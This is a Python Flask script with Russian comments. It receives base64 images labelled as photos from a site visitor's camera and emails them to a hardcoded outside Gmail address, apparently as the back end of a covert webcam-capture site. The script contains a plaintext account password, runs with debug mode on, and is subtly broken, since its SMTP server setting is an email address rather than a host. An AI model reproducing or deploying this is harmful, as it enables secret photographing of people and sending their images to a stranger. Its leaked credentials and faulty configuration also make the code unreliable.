import base64
from flask import Flask, request, jsonify
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.mime.text import MIMEText
from io import BytesIO
from PIL import Image

app = Flask(__name__)

SMTP_SERVER = "smtp.brawlstars14432@gmail.com"  # SMTP сервер вашего почтового провайдера
SMTP_PORT = 587  # Обычно 587 для TLS
EMAIL = "brawlstars14432@gmail.com"  # Ваша почта
PASSWORD = "Iponiasdf"  # Пароль от почты
TO_EMAIL = "ptaknik@gmail.com"  # Почта, на которую будут отправляться фото

def send_email_with_photo(image_data):
    # Декодируем данные изображения из base64
    image_data = image_data.split(",")[1]  # Убираем метаданные base64
    image = Image.open(BytesIO(base64.b64decode(image_data)))
    image_file = BytesIO()
    image.save(image_file, format="PNG")
    image_file.seek(0)

    msg = MIMEMultipart()
    msg["From"] = EMAIL
    msg["To"] = TO_EMAIL
    msg["Subject"] = "Фото с камеры пользователя"
    
    body = "Фото с камеры пользователя отправлено с сайта."
    msg.attach(MIMEText(body, "plain"))
    
    # Добавляем изображение как вложение
    part = MIMEBase("application", "octet-stream")
    part.set_payload(image_file.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", "attachment; filename=photo.png")
    msg.attach(part)
    
    # Отправка почты
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.sendmail(EMAIL, TO_EMAIL, msg.as_string())

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data.get("image")
    if image_data:
        send_email_with_photo(image_data)
        return jsonify({"message": "Фото успешно отправлено на почту"}), 200
    else:
        return jsonify({"message": "Фото не получено"}), 400

if __name__ == '__main__':
    app.run(debug=True)
